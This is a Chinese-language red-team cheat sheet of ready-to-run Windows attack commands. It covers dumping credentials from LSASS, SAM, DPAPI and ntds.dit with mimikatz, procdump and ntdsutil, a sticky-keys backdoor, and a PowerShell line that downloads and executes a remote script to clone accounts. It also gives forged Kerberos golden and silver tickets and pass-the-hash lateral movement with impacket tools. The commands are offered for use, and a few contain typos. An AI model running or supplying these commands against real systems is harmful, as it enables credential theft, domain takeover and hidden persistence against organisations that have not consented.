## 红队命令

### Win-凭证获取

~~~
🚀
mimikatz.exe "log hash.txt" "privilege::debug" "sekurlsa::logonPasswords" "exit"
mimikatz.exe "log hash.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"

🚀 利用具有微软签名的DumpMinitool.exe工具导出内存
# --file 保存的文件名
# --processId lsass.exe 进程号
DumpMinitool.exe --file dump.txt --processId 948 --dumpType Full

🚀获取系统保存的RDP密码
# 查询远程连接记录
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
# 解密出明文RDP连接密码, mimikatz执行如下命令:
privilege::debug
dpapi::cred /in:{凭证文件}
sekurlsa::dpapi
dpapi::cred /in:{凭证文件} /masterkey:{MasterKey}
exit

🚀获取系统保存的VPN密码
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

🚀获取系统连接的WIFI密码
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

🚀卷影拷贝获取域控凭证, 此方法支持windows server 2003、2008、2012
# 第一步：创建快照 产生的快照GUID为：{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}
ntdsutil.exe snapshot "activate instance ntds" create quit quit
# 第二步：加载快照 快照位置：C:\$SNAP_202009222211_VOLUMEC$\
ntdsutil.exe snapshot "mount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" quit quit
# 第三步：复制快照中的ntds.dit文件
copy 'C:\$SNAP_202009222211_VOLUMEC$\Windows\NTDS\ntds.dit' C:\ntds.dit
# 第四步：删除快照
ntdsutil.exe snapshot "List All" quit quit
ntdsutil.exe snapshot "umount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" "delete {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" quit quit
ntdsutil.exe snapshot "List All" quit quit

🚀利用注册表离线导出Hash
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\security security.hiv

🚀使用mimikatz解密Hash
mimikatz.exe "log hash.txt" "lsadump::sam /system:system.hiv /sam:sam.hiv /security security.hiv" exit

🚀利用procdump导出内存文件
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 使用mimikatz抓取密码
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log hash.txt" "sekurlsa::logonPasswords full" "exit"

🚀离线获取系统保存的RDP密码
# 查询远程连接记录
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
# 上传procdump获取内存文件, procdump执行如下命令:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 解密出明文RDP连接密码, mimikatz执行如下命令:
privilege::debug
dpapi::cred /in:{凭证文件}
sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
dpapi::cred /in:{凭证文件} /masterkey:{MasterKey}
exit

🚀利用PowerShell导出内存
powershell -c "rundll32 C:\windows\system32\comsvcs.dll MiniDump {pid} {output} full"
# 获取保存到注册表中的密码
REG query HKCU /v "pwd" /s"

~~~

### Win-权限维持

~~~
🚀
粘滞键后门
pushd C:\windows\system32
move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe

🚀 克隆账号
# 将一个账号当前的权限以及账号相关信息克隆到另外一个新账户中, 如果被克隆账号被禁用, 则无法克隆
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd

🚀 伪造黄金票据(伪造TGT)
# 伪造条件：需要伪造的域管理员用户名、完整的域名、域SID、krbtgt的NTLM Hash或AES-256值
# 注意事项：伪造用户可以是任意用户（TGT的加密是由krbtgt完成的，只要TGT被krbtgt账户密码正确加密，那么任意KDC使用krbtgt解密TGT中的信息也是可信的）
# 获取管理员账号
net group "domain admins" /domain
# 获取域名
ipconfig /all
# 获取域SID
wmic useraccount get name,sid //获取域内所有用户sid
whomai /user //获取当前用户sid
# 导出krbtgt的ntml hash (使用mimikatz工具的dcsysc功能远程转储活动目录的ntds.dit并导出krbtgt账号信息)
minikatz.exe "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
# 清空票据 mimikatz中输入如下命令
kerberos::purge 或者 klist purge
# 生成票据
kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi
# 传递票据并注入(如果上一步用的/ptt参数就跳过这一步)
Kerberos::ptt golden.kiribi
# 查看当前会话中的票据
Kerberos::tgt
# 验证权限
dir \\dc\c$

🚀 伪造白银票据(伪造TGS)
# 伪造条件：域名、域SID、需要伪造的用户名、目标服务器的FQDN(Fully Qualified Domain Name) //全限定域名：同时带有主机名和域名的名称、可利用的服务、服务账号的NTML Hash
# 注意事项：票据20分钟内有效，过期之后可以再次导入、银票是伪造的TGS，所以没有与域控制器通信、白银票据仅限于特定服务器上的任何服务、产生任何事件日志都在目标服务器上
# 获取域名
ipconfig /all
# 获取域SID
wmic useraccount get name,sid //获取域内所有用户sid
whomai /user //获取当前用户sid
# 获取服务账号的NTML Hash
Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit // 需要管理员权限
# 清空票据 mimikatz中输入如下命令
kerberos::purge
# 生成票据
mimikatz "kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt" exit
白银票据需要的参数:
/target: 目标服务器的FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号"."）
/service: 运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等
/rc4: 服务的NTLM散列（计算机帐户或用户帐户）
# 查看当前会话中的票据
Kerberos::tgt
# 验证权限
dir \\dc\c$
~~~

### Win-横向移动

~~~
🚀
# 开启UAC后, 只有本地管理员组里的账户能pth。域Domain admin默认在本地管理员组
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

🚀445端口SMB哈希传递
# 使用impacket套件的psexec.exe工具：
# 需要开放445端口, 此方法已被杀软列入黑名单
# 需要远程系统开启admin$共享（默认是开启的）
# 在使用PsExec执行命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将被自动删除。但创建或删除服务时会产生大量的日志
# -accepteula：第一次运行PsExec会弹出确认框，使用该参数就不会弹出确认框
# -s：以system权限运行远程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个administrator权限的shell。
psexec.exe /accepteula /s \\127.0.0.1 -u cloud/administrator -p P@ssw0rd -s cmd

🚀使用impacket套件的mmcexec工具：
mmcexec.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

🚀使用impacket套件的smbclient工具：
smbclient.exe cloud/administrator:P@ssw0rd@127.0.0.1
smbclient.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

🚀135端口WMI哈希传递
# 使用impacket套件的wmiexec工具：
# 在使用wmiexec进行横向移动时，Windows操作系统默认不会产生日志，此方法比PsExec隐蔽性要更好一些
wmiexec.exe cloud/administrator:P@ssw0rd@127.0.0.1
wmiexec.exe -hashes :e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

🚀查看远程计算机进程
tasklist /S 192.168.31.17 /U domain\administrator /P /V
~~~